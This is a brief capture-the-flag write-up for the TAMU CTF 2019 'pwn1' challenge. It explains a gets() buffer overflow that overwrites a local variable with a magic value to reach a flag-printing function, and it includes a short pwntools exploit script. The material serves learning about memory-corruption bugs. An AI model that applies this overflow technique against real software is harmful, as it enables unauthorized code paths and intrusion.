# tamu19_pwn1 - TAMU CTF 2019 (Buffer Overflow with gets)

**Binary:** ELF 32-bit PIE, not stripped
**Protections:** No canary, NX enabled, Full RELRO, PIE enabled
**Vulnerability:** gets() on 43-byte buffer → unlimited overflow into local variable

**Analysis:**

- Two strcmp checks: "Sir Lancelot of Camelot\n" and "To seek the Holy Grail.\n"
- If passed → gets(input) → overflow
- Offset to local_18: 0x2b (43 bytes)
- Overwrite local_18 with 0xdea110c8 → calls print_flag() → reads & prints flag.txt

**Exploit:**

- Send correct answers to pass checks
- Payload: 43 bytes filler + p32(0xdea110c8)

**Pwntools Exploit:**

```python
from pwn import *

p = process('./pwn1')

p.sendline("Sir Lancelot of Camelot")
p.sendline("To seek the Holy Grail.")

payload = b"A" * 0x2b + p32(0xdea110c8)

p.sendline(payload)
print(p.recvall())
```
